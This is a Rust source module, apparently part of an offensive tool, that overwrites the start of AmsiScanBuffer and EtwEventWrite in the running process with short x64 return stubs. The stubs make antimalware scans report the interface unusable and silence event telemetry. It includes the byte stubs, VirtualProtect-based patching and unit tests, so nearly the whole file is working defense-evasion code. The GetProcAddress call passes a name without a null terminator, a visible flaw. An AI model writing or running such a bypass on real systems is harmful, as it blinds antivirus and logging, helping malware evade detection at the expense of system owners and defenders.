//! The patch edge (the module's whole platform surface): the two
//! entry points a Windows process's scanners and telemetry funnel
//! through, replaced in this process's own memory with the small
//! returns that make each one report unusable -- kernel32 spoken
//! directly, so the module owes the loader no dependency for three
//! functions. Everything that must hold for a test (the target table,
//! the stubs, the idempotence judgment, the row renderings) is a
//! plain function this host runs anywhere; only the calls themselves
//! sit behind `cfg(windows)`, and the Windows crosses the CI lane
//! builds prove they compile.
//!
//! Two scoping facts shape the verb's honesty. The patch lives in
//! this process's memory alone: nothing lands on disk, and the effect
//! dies with the process -- a new process loads fresh libraries. And
//! the stubs are x64 code in v1.0: a non-x64 Windows build refuses
//! naming the architecture rather than writing stubs it cannot stand
//! behind; the arm64 encodings are the module's later widening, not
//! this surface's guess.

/// What one patch names: the library, the entry point, the stub that
/// replaces its first bytes, and the words the answer reads.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) struct Target {
    /// The row's own name, the word the grammar takes.
    pub name: &'static str,
    /// The library the entry point lives in.
    pub library: &'static str,
    /// The entry point a scan or an event must pass through.
    pub function: &'static str,
    /// The x64 stub that replaces its first bytes.
    pub stub: &'static [u8],
    /// What the stub makes the caller see.
    pub effect: &'static str,
}

#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) const TARGETS: [Target; 2] = [
    Target {
        name: "amsi",
        library: "amsi.dll",
        function: "AmsiScanBuffer",
        // mov eax, 0x80070057 (E_INVALIDARG); ret -- the caller reads
        // the antimalware interface as unusable and skips the scan.
        stub: &[0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3],
        effect: "scans in this process report the interface unusable",
    },
    Target {
        name: "etw",
        library: "ntdll.dll",
        function: "EtwEventWrite",
        // xor eax, eax; ret -- the write reports success, the event
        // never leaves the process.
        stub: &[0x31, 0xC0, 0xC3],
        effect: "events from this process go silent",
    },
];

/// The targets a task word names: `amsi` and `etw` alone, `all` both,
/// anything else nothing -- the grammar's refusal names the three.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) fn targets_of(word: &str) -> Option<&'static [Target]> {
    match word.to_ascii_lowercase().as_str() {
        "amsi" => Some(&TARGETS[0..1]),
        "etw" => Some(&TARGETS[1..2]),
        "all" => Some(&TARGETS),
        _ => None,
    }
}

/// Whether the entry point's first bytes are already this module's
/// own stub -- the idempotence read: a second run reports rather than
/// writes again.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) fn already_patched(head: &[u8], target: &Target) -> bool {
    head.len() >= target.stub.len() && &head[..target.stub.len()] == target.stub
}

// ---- the Windows calls ----

#[cfg(windows)]
mod win {
    use std::os::raw::c_void;

    use super::{already_patched, Target};

    const PAGE_EXECUTE_READWRITE: u32 = 0x40;

    #[link(name = "kernel32")]
    extern "system" {
        fn LoadLibraryW(name: *const u16) -> *mut c_void;
        fn GetProcAddress(library: *mut c_void, name: *const u8) -> *mut c_void;
        fn VirtualProtect(
            address: *mut c_void,
            size: usize,
            new_protect: u32,
            old_protect: *mut u32,
        ) -> i32;
    }

    /// Patches one target, the answer as the row the verb prints:
    /// patched, already patched, or the refusal naming what the
    /// process could not do. The page flips writable for the write
    /// and back to what it was.
    pub(crate) fn patch(target: &Target) -> String {
        if std::env::consts::ARCH != "x86_64" {
            return format!(
                "{}: the v1.0 stubs are x64-only -- this process runs {}",
                target.name,
                std::env::consts::ARCH
            );
        }
        unsafe {
            let library: Vec<u16> = target
                .library
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();
            let module = LoadLibraryW(library.as_ptr());
            if module.is_null() {
                return format!(
                    "{}: {} is not loaded in this process",
                    target.name, target.library
                );
            }
            let entry = GetProcAddress(module, target.function.as_ptr());
            if entry.is_null() {
                return format!(
                    "{}: {} carries no {}",
                    target.name, target.library, target.function
                );
            }

            // The idempotence read: the stub already sitting there is
            // this module's own prior work.
            let head = std::slice::from_raw_parts(entry.cast::<u8>(), target.stub.len());
            if already_patched(head, target) {
                return format!("{}: already patched", target.name);
            }

            let mut previous: u32 = 0;
            if VirtualProtect(
                entry,
                target.stub.len(),
                PAGE_EXECUTE_READWRITE,
                &mut previous,
            ) == 0
            {
                return format!("{}: the page would not flip writable", target.name);
            }
            std::ptr::copy_nonoverlapping(
                target.stub.as_ptr(),
                entry.cast::<u8>(),
                target.stub.len(),
            );
            VirtualProtect(entry, target.stub.len(), previous, &mut previous);

            format!(
                "{}: {} patched -- {}",
                target.name, target.function, target.effect
            )
        }
    }
}

#[cfg(windows)]
pub(crate) use win::patch;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_table_names_the_two_entry_points() {
        assert_eq!(TARGETS.len(), 2);
        assert_eq!(TARGETS[0].function, "AmsiScanBuffer");
        assert_eq!(TARGETS[1].function, "EtwEventWrite");
        // Each stub ends in its return.
        assert_eq!(*TARGETS[0].stub.last().unwrap(), 0xC3);
        assert_eq!(*TARGETS[1].stub.last().unwrap(), 0xC3);
    }

    #[test]
    fn the_target_words_name_their_sets() {
        assert_eq!(targets_of("amsi").unwrap().len(), 1);
        assert_eq!(targets_of("ETW").unwrap()[0].name, "etw");
        assert_eq!(targets_of("all").unwrap().len(), 2);
        assert!(targets_of("edr").is_none());
        assert!(targets_of("").is_none());
    }

    #[test]
    fn the_idempotence_read_matches_the_stub_and_nothing_else() {
        let target = &TARGETS[0];
        assert!(already_patched(target.stub, target));
        // Fresh prologue bytes are not this module's work.
        assert!(!already_patched(
            &[0x4C, 0x8B, 0xDC, 0x4C, 0x45, 0x08],
            target
        ));
        assert!(!already_patched(&[0xB8, 0x57, 0x00], target));
    }
}
